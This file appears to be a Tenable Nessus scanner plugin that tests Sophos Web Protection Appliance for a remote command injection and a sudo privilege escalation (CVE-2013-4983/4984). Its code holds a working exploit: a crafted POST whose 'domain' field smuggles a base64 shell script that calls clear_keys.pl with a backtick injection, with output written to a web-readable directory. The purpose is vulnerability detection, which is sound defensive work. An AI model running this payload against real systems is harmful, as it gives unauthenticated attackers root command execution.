#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70142);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/01/16 15:05:10 $");

  script_cve_id("CVE-2013-4983", "CVE-2013-4984");
  script_bugtraq_id(62263, 62265);
  script_osvdb_id(97028, 97029);
  script_xref(name:"EDB-ID", value:"28175");
  script_xref(name:"EDB-ID", value:"28332");
  script_xref(name:"EDB-ID", value:"28334");

  script_name(english:"Sophos Web Protection Appliance Multiple Vulnerabilities");
  script_summary(english:"Attempts to execute an OS command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web application that is affected by
multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The Sophos Web Protection application running on the remote host is
affected by multiple vulnerabilities :

  - A remote command execution vulnerability exists in the
    /opt/ws/bin/sblistpack Perl script due to improper
    sanitization of user-supplied input when the 'action'
    parameter is set to 'continue' and the 'args_reason'
    parameter is set to anything other than 'filetypewarn'.
    An unauthenticated, remote attacker can exploit this by
    sending a specially crafted request to the
    /end-user/index.php script, resulting in the execution
    of arbitrary commands subject to the privileges of the 
    'spiderman' user id. (CVE-2013-4983)

  - A privilege escalation vulnerability exists in the
    close_connections() function in the clear_keys.pl script
    due to a failure to properly escape second arguments. A
    local attacker can exploit this to escalate privileges.
    (CVE-2013-4984)

Note that the application is reportedly affected by a cross-site
scripting vulnerability; however, this plugin has not tested for it.");
  # http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dfca1b70");
  # https://web.archive.org/web/20150425170751/https://www.sophos.com/en-us/support/knowledgebase/119773.aspx
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6d3b1f2b");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Sophos Web Protection Appliance version 3.7.9.1 / 3.8.1.1
or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Sophos Web Protection Appliance 3.8.1 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Sophos Web Protection Appliance clear_keys.pl Local Privilege Escalation');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/09/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/09/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/09/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sophos:web_appliance");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:sophos:sophos_web_protection");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("sophos_web_protection_detect.nasl");
  script_require_keys("installed_sw/sophos_web_protection");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

get_install_count(app_name:'sophos_web_protection', exit_if_zero:TRUE);
port = get_http_port(default:443);
install = get_single_install(app_name:'sophos_web_protection', port:port);

dir = install['dir'];
install_url = build_url(qs:dir, port:port);

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

# nb: Domain and user can be any arbitrary values in this attack
domain = "localhost";
user = "nessus";
time = unixtime();
script = SCRIPT_NAME - ".nasl" + '-' + time;
path = "/opt/ui/apache/htdocs/backup/";

attack = 'sudo /opt/cma/bin/clear_keys.pl ' +time+ ' ";`echo ' +cmd+ '` > ' +
  path+script+'.txt;" /' +time;

postdata =
  "url=" +base64(str:domain)+ "&args_reason=any&filetype=dummy&user="
  +user+ "&user_encoded=" +base64(str:user)+ "&domain=" +domain+ ';echo ' +
  base64(str:attack)+ '|base64 --decode > ' +path+script+
  '.sh;chmod u+rwx ' +path+script+ '.sh;sh ' +path+script+ '.sh;rm '
  +path+script+ '.sh&raw_category_id=one|two|three|four';

postdata = urlencode(
  str        : postdata,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                 "56789=+&_.-"
);

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : dir + "/end-user/index.php?c=blocked&action=continue",
  data   : postdata,
  add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"),  
  exit_on_fail: TRUE
);

attack_req = http_last_sent_request();

# nb: The file we created above will end up in /backup
upload_url = "backup/" +script+ ".txt";
res2 = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/" + upload_url,
  exit_on_fail : TRUE
);

if (egrep(pattern:cmd_pat, string:res2[2]))
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to execute the command "' +cmd+ '" on the remote' +
      ' host' + '\nusing the following request :' +
      '\n' +
      '\n' +attack_req+
      '\n' +
      '\nNessus verified this by requesting the following URL and examining' +
      '\nthe output :' +
      '\n\n  ' + install_url + upload_url +
      '\n' +
      '\n(Note that the file at :\n' +path+script+ '.txt' +
      '\nhas not been removed and will need to be manually deleted.)' +
      '\n';

    if (report_verbosity > 1)
    {
      snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report +=
        '\nThis produced the following output :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(res2[2]) +
        '\n' + snip +
        '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "Sophos Web Protection", install_url);
